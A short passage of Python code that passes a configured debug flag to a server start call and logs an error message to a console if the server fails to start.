            debug=CONFIG['server']['debug']
        )
    except Exception as e:
        add_to_console(f"Failed to start server: {str(e)}", "error")